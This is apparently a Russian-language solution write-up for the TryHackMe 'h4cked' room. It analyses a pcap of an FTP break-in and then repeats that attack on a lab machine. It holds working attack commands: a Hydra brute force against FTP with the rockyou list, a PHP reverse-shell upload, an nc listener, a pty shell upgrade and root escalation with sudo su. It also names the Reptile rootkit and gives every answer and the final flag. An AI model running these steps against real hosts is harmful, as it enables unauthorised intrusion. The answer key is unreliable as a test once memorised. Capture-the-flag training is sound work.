

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [h4cked](https://tryhackme.com/r/room/h4cked) 

Всего 2 задания:
## Задание 1
### Ответьте на вопросы ниже
Похоже, нашу машину взломал анонимный злоумышленник. Однако нам повезло, что у нас есть файл .pcap от атаки. Можете 
ли вы определить, что произошло? Загрузите файл .pcap и используйте Wireshark, чтобы просмотреть его. 
```commandline
Ответ не нужен
```
Злоумышленник пытается войти в определенный сервис. Что это за сервис?
`FTP (File Transfer Protocol)` — сетевой протокол для передачи файлов между компьютерами через соединения Transmission 
Control Protocol/Internet Protocol (TCP/IP). В рамках пакета TCP/IP FTP считается протоколом прикладного уровня. 
```commandline
FTP
```
Есть очень популярный инструмент от Van Hauser, который можно использовать для взлома серии сервисов. Как называется 
этот инструмент?
[Hydra](https://github.com/vanhauser-thc/thc-hydra) — это параллельный взломщик входа в систему, поддерживающий 
множество протоколов для атаки. 
```commandline
Hydra
```
Злоумышленник пытается войти в систему с определенным именем пользователя. Какое имя пользователя?
```commandline
Jenny
```
Какой пароль у пользователя?
Если посмотреть на ответы на соответствующие запросы, то там есть ответ под названием «Вход выполнен успешно». Чтобы 
отфильтровать по определенному потоку, выберите пакет TCP, UDP, DCCP, TLS, HTTP, HTTP/2, QUIC или SIP в списке 
пакетов интересующего вас потока/соединения, а затем выберите пункт меню Анализ → Отслеживать → Поток TCP . 
Wireshark установит соответствующий фильтр отображения и отобразит диалоговое окно с разложенными данными из потока.   
```commandline
password123
```
Каков текущий рабочий каталог FTP после входа злоумышленника в систему?
Мы можем выполнить поиск по команде «pwd», чтобы определить рабочий каталог. Команда pwd (печать рабочего каталога) 
записывает в стандартный вывод полный путь к текущему каталогу (от корневого каталога). 
```commandline
/var/www/html
```
Атакующий загрузил бэкдор. Каково имя файла бэкдора?
Знание важных деталей, таких как имя файла, расширение файла или команда, ускоряет процесс анализа.
Мы видим, что на этом этапе злоумышленник использует бэкдор под названием «shell.php». Клиент выдает команду STOR 
после успешного установления соединения для передачи данных, когда он хочет загрузить копию локального файла на сервер. 
```commandline
shell.php
```
Бэкдор можно загрузить с определенного URL, так как он находится внутри загруженного файла. Каков полный URL?
```commandline
http://pentestmonkey.net/tools/php-reverse-shell
```
Какую команду злоумышленник выполнил вручную после получения обратного шелла?
Как следует из названия, команда whoami выводит имя пользователя эффективного идентификатора пользователя. Другими 
словами, она отображает имя текущего вошедшего в систему пользователя. 
```commandline
whoami
```
Каково имя хоста компьютера?
```commandline
wir3
```
Какую команду выполнил злоумышленник, чтобы создать новую оболочку TTY?
```commandline
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Какая команда была выполнена для получения root-оболочки?
```commandline
sudo su
```
Злоумышленник скачал что-то с GitHub. Как называется проект GitHub?
[Reptile](https://github.com/f0rb1dd3n/Reptile) — это руткит режима ядра Linux с возможностью обхода обнаружения, 
сохранения и наличия бэкдора. 

```commandline
Reptile
```
Проект может быть использован для установки скрытого бэкдора в системе. Его может быть очень трудно обнаружить. Как 
называется этот тип бэкдора?
Вредоносное ПО `Rootkit` представляет собой набор программного обеспечения, предназначенного для предоставления 
злоумышленникам контроля над компьютерной сетью или приложением. 
```commandline
Rootkit
```

## Задание 2
### Ответьте на вопросы ниже
Разверните машину.

Атакующий изменил пароль пользователя! Можете ли вы повторить действия атакующего и прочитать flag.txt? Флаг 
находится в каталоге /root/Reptile. Помните, вы всегда можете вернуться к файлу .pcap, если это необходимо. Удачи! 

Для подключения к машинам в TryHackMe через VPN вам понадобится файл конфигурации [OpenVPN](https://tryhackme.com/access?o=vpn).

```commandline
openvpn file.ovpn
nmap -A -T4 -Pn -p- 10.10.177.32
```
```commandline
Ответ не нужен
```
Запустите Hydra (или любой аналогичный инструмент) на FTP-сервисе. Злоумышленник мог выбрать несложный пароль. Вам 
может повезти, если вы используете общий список слов. 
```commandline
hydra -l jenny -P /usr/share/wordlists/rockyou.txt 10.10.177.32 ftp
ftp 10.10.177.32
get shell.php
```
```commandline
Ответ не нужен
```
Измените необходимые значения внутри веб-оболочки и загрузите ее на веб-сервер.
```commandline
leafpad shell.php
put shell.php
```
```commandline
Ответ не нужен
```
Создайте прослушиватель на указанном порту на машине атакующего. Выполните веб-оболочку, посетив файл .php на 
целевом веб-сервере. 
```commandline
nc -lvnp 4444
whoami
python3 -c 'import pty; pty.spawn("/bin/bash")'
su jenny
password123
```
```commandline
Ответ не нужен
```
Станьте пользователем root!
```commandline
sudo -l
sudo su
whoami
```
```commandline
Ответ не нужен
```
Прочитайте файл flag.txt в каталоге Reptile.
```commandline
cd /root/Reptile
ls -al
cat flag.txt
```
```commandline
ebcefd66ca4b559d17b440b6e67fd0fd
```



[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)